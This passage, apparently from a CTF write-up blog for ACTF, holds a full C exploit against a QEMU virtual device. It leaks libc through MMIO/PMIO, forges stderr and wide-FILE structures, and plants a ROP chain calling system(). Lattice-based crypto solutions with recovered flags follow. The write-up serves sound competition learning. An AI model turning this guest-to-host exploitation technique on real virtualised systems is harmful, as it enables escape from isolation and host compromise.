class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> pmio_base = <span class="number">0xc040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr + pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">pmio_read_byte</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr + pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write_dword</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    outl(value, addr + pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write_word</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint16_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    outw(value, addr + pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write_byte</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint8_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    outb(value, addr + pmio_base);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span> *)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_dword</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line"></span><br><span class="line">    *((<span class="type">uint32_t</span> *)(mmio_mem + addr)) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read_dword</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint64_t</span> *)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">u64</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * s)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">7</span> ; i &gt;=<span class="number">0</span> ;i--) &#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">8</span>) | (<span class="number">0x00000000000000ff</span>&amp;s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">p</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">read_ptr_dword</span><span class="params">(<span class="type">uint32_t</span> off)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        res &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">        <span class="type">uint8_t</span> tmp = pmio_read_byte(<span class="number">0x10</span> + i + off);</span><br><span class="line">        res += tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_ptr_dword</span><span class="params">(<span class="type">uint32_t</span> off, <span class="type">uint32_t</span> val)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="type">uint8_t</span> tmp = val &amp; <span class="number">0xff</span>;</span><br><span class="line">        pmio_write_byte(<span class="number">0x10</span> + i + off, tmp);</span><br><span class="line">        val &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">u32</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">read_ptr_qword</span><span class="params">(<span class="type">uint32_t</span> off)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> low = read_ptr_dword(off);</span><br><span class="line">    <span class="type">uint64_t</span> high = read_ptr_dword(off + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) + low;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_ptr</span><span class="params">(<span class="type">uint32_t</span> addr)</span> &#123;</span><br><span class="line">    mmio_write_dword(<span class="number">0x40</span>, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">read_qword_in</span><span class="params">(<span class="type">uint64_t</span> addr)</span> &#123;</span><br><span class="line">    set_ptr(u32(addr));</span><br><span class="line">    <span class="keyword">return</span> read_ptr_qword(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_qword_in</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span> &#123;</span><br><span class="line">    set_ptr(u32(addr));</span><br><span class="line">    write_ptr_dword(<span class="number">0</span>, u32(val));</span><br><span class="line">    write_ptr_dword(<span class="number">4</span>, u32(val &gt;&gt; <span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// void write_str(unsigned char * s, uint32_t len) &#123;</span></span><br><span class="line"><span class="comment">//     for(int i = 0; i &lt; len; i++) &#123;</span></span><br><span class="line"><span class="comment">//         pmio_write_byte()</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_ARENA_OFF 0x8a0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_OFF 0x219c80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYSTEM_OFF 0x50d70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDERR_OFF 0x21a6a0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FAKE_WIDE_FILE_OFF 0x21b000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WFILE_JUMPS_OFF 0x2160c0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_OFF 0x158</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="type">int</span> mmio_fd =</span><br><span class="line">        open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        die(<span class="string">&quot;io permission&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mmio_read()</span></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> flag1[] = <span class="string">&quot;ACTF&#123;cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(flag1) - <span class="number">1</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        mmio_write_dword(i, *(<span class="type">uint32_t</span> * )(flag1 + i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pmio_write_byte(<span class="number">1</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(pmio_read_byte(<span class="number">0x1</span>) != <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write_byte(<span class="number">0x1f</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="type">uint64_t</span> arena_ptr = (read_ptr_qword(<span class="number">0</span>) &amp; <span class="number">-0x1000</span>) + NEXT_ARENA_OFF;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_arena = %#lx\n&quot;</span>, arena_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> next_arena_ptr = (read_qword_in(arena_ptr) &amp; <span class="number">-0x1000</span>) + NEXT_ARENA_OFF;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;next_arena = %#lx\n&quot;</span>, next_arena_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_arena = read_qword_in(next_arena_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_arena = %#lx\n&quot;</span>, libc_arena);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> libc_base = libc_arena - MAIN_ARENA_OFF;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_base = %#lx\n&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_func = libc_base + SYSTEM_OFF;</span><br><span class="line">    <span class="comment">// write_qword_in(libc_arena, system_func);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> stderr_ptr = libc_base + STDERR_OFF;</span><br><span class="line">    write_qword_in(stderr_ptr, <span class="number">0ull</span>);</span><br><span class="line">    write_qword_in(stderr_ptr + <span class="number">0x8</span>, <span class="number">0xa81u</span>ll);</span><br><span class="line">  </span><br><span class="line">    <span class="type">uint64_t</span> fake_wfile_ptr = libc_base + FAKE_WIDE_FILE_OFF;</span><br><span class="line">    write_qword_in(stderr_ptr + <span class="number">0xa0</span>, fake_wfile_ptr);</span><br><span class="line"></span><br><span class="line">    write_qword_in(stderr_ptr + <span class="number">0xc0</span>, <span class="number">3ull</span>); <span class="comment">// mode</span></span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> wfile_jumps = libc_base + WFILE_JUMPS_OFF;</span><br><span class="line">    write_qword_in(stderr_ptr + <span class="number">0xd8</span>, wfile_jumps);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// write_qword_in(fake_wfile_ptr + 0x18, 0ull);</span></span><br><span class="line">    <span class="comment">// write_qword_in(fake_wfile_ptr + 0x30, 0ull);</span></span><br><span class="line"></span><br><span class="line">    write_qword_in(fake_wfile_ptr + <span class="number">0x20</span>, <span class="number">1ull</span>); <span class="comment">// set wide_file._IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">    write_qword_in(fake_wfile_ptr + <span class="number">0xe0</span>, fake_wfile_ptr + <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x000000000005a120: mov rsp, rdx; ret;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="type">uint64_t</span> u64;</span><br><span class="line">    u64 mov_rsp_rdx = libc_base + <span class="number">0x000000000005a120</span>;</span><br><span class="line"><span class="comment">// 0x00000000000c46bc: add rsp, 0x100; sub rax, rdx; ret;</span></span><br><span class="line">    u64 adjust_stack = libc_base + <span class="number">0x00000000000c46bc</span>;</span><br><span class="line">    u64 pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span>;</span><br><span class="line">    u64 pop_rsi = libc_base + <span class="number">0x000000000002be51</span>;</span><br><span class="line">    u64 pop_rdx = libc_base + <span class="number">0x00000000000796a2</span>;</span><br><span class="line">    u64 pop_rax = libc_base + <span class="number">0x0000000000045eb0</span>;</span><br><span class="line">    u64 syscall_ret = libc_base + <span class="number">0x0000000000091316</span>;</span><br><span class="line"></span><br><span class="line">    write_qword_in(fake_wfile_ptr + <span class="number">0x0</span>, adjust_stack);</span><br><span class="line">    write_qword_in(fake_wfile_ptr + <span class="number">0xe8</span>, mov_rsp_rdx);</span><br><span class="line"></span><br><span class="line">    u64 ropchain[] = &#123;</span><br><span class="line">        pop_rdi,</span><br><span class="line">        fake_wfile_ptr + CMD_OFF,</span><br><span class="line">        pop_rdi + <span class="number">1</span>,</span><br><span class="line">        system_func</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(ropchain) / <span class="keyword">sizeof</span>(ropchain[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        write_qword_in(fake_wfile_ptr + <span class="number">0x108</span> + i * <span class="number">8</span>, ropchain[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u64 cmd[] = &#123;</span><br><span class="line">        <span class="number">7449354444534473059ull</span>,</span><br><span class="line">        <span class="number">215389974816ull</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(cmd) / <span class="keyword">sizeof</span>(cmd[<span class="number">0</span>]); i++) &#123;</span><br><span class="line">        write_qword_in(fake_wfile_ptr + CMD_OFF + i * <span class="number">8</span>, cmd[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// p();</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h3><span id="easyrsa">EasyRSA</span><a href="#easyrsa" class="header-anchor"></a></h3><p><strong>$$E<em>D-k_1</em>n_1&#x3D;A\E<em>D-a</em>n_2&#x3D;B\E<em>D-d</em>n_3&#x3D;C$$</strong></p>
<p>存在这三个等式关系，其中D，A，B，C均为小于E的较小数直接造格就好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">M = Matrix(ZZ,[[e,e,e,<span class="number">2</span>^<span class="number">767</span>],</span><br><span class="line">               [n1,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">               [<span class="number">0</span>,n2,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">               [<span class="number">0</span>,<span class="number">0</span>,n3,<span class="number">0</span>]])</span><br><span class="line"><span class="comment"># e_*d_-k1*n1,n1</span></span><br><span class="line">d=<span class="built_in">abs</span>(M.LLL()[<span class="number">0</span>][<span class="number">3</span>]//<span class="number">2</span>^<span class="number">767</span>)</span><br><span class="line">long_to_bytes(ZZ(<span class="built_in">pow</span>(c,d,n1)))</span><br><span class="line"><span class="comment">#ACTF&#123;5FFC427B-F14F-DCA0-C425-675B149890C2&#125;ACTF&#123;5FFC427B-F14F-DCA0-C425-675B149890C2&#125;</span></span><br></pre></td></tr></table></figure>

<h3><span id="mdh">MDH</span><a href="#mdh" class="header-anchor"></a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># sage</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">ct = 8308943029741424587523612386337754255889681699670071706719724435165094611096603769021839263</span><br><span class="line">pa = []</span><br><span class="line">pb = []</span><br><span class="line">p = 308955606868885551120230861462612873078105583047156930179459717798715109629</span><br><span class="line">Fp = GF(p)</span><br><span class="line">pa = Matrix(Fp, pa)</span><br><span class="line">pb = Matrix(Fp, pb)</span><br><span class="line">shared = pa*pb.T</span><br><span class="line">shared = shared.trace()</span><br><span class="line">shared = int(sha256(str(int(shared)).encode()).hexdigest(), 16)</span><br><span class="line">flag = shared ^^ ct</span><br><span class="line">flag = bytes.fromhex(hex(flag)[2:])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h3><span id="claw-crane">claw crane</span><a href="#claw-crane" class="header-anchor"></a></h3><p>这里是用WASD去移动到特定的position，显然方案不止一种，不同的方案会影响后边函数gen_chaos的输出</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=YTZlNmMzOTcyYWUxMDhiNDE2NGE1YzQ3MDFiYTNkNGJfeGM0MEFrMUduc0ZYNXp4QkFERmE1NUJEUThMc0VENWdfVG9rZW46VHFNeWIyZEpPb2hQZzl4aVNPRmNLSmlybmhkXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>destiny函数直接影响了score，delta越小以及bless越大则赢的概率越大。因此考虑怎么让delta小一点，而p和q是可控的，这里考虑造个格(?)规约。或者不管r的值，毕竟它经过md5输出也不太可控，把delta的式子看作不定方程。</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=ODMyY2VmNTUwZWQ3MWYzMDM2MjVmNDgyM2Q2ZDk2MmNfN1MzM0N4RFN0WDZ3Z29uaDl2eFlMbmRnU0VGV3ZIM0hfVG9rZW46UVp2d2JCZElab3l2Mk54UHN2VGN3VUZ5bkFmXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p><img src="https://qj6y8r4zfe.feishu.cn/space/api/box/stream/download/asynccode/?code=NjA3YmVhZGNiNTZmNGRhYmZmYmI4YjkwZTdlZjdhMDRfb0NHZGNsMkdaSUhzUlJkUmtsMkJHSDd1RVRBbnVWbExfVG9rZW46T3RzdWJwMzV0b0dlMnB4UVN4dmM0RkVPbjlnXzE2OTg2NzE4OTA6MTY5ODY3NTQ5MF9WNA">​</p>
<p>md5那个位置该怎么利用没想好。</p>
<p>可以通过前64个move来控制vs，使得计算md5(self.seed + vs)的时候，结果总是上一次的self.seed，r就固定了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">last_chaos = ...</span><br><span class="line">vs = (-last_chaos -<span class="number">1</span>) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">128</span>)</span><br></pre></td></tr></table></figure>

<p>再通过move[64:]走到pos处</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> multiprocessing.spawn <span class="keyword">import</span> freeze_support</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">conn</span>):</span><br><span class="line">    conn.recvuntil(<span class="string">&quot;prefix+\&quot;&quot;</span>)</span><br><span class="line">    suffix = conn.recv(<span class="number">58</span>).decode()</span><br><span class="line">    conn.recvuntil(<span class="string">&quot;==&quot;</span>)</span><br><span class="line">    digest = conn.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">        <span class="keyword">return</span> sha1((x + suffix).encode()).hexdigest() == digest</span><br><span class="line"></span><br><span class="line">    proof = mbruteforce(f, <span class="string">&quot;0123456789abcdef&quot;</span>, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;proof: <span class="subst">&#123;proof&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    conn.sendlineafter(<span class="string">&quot;prefix = ?\n&quot;</span>, proof.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_choas</span>(<span 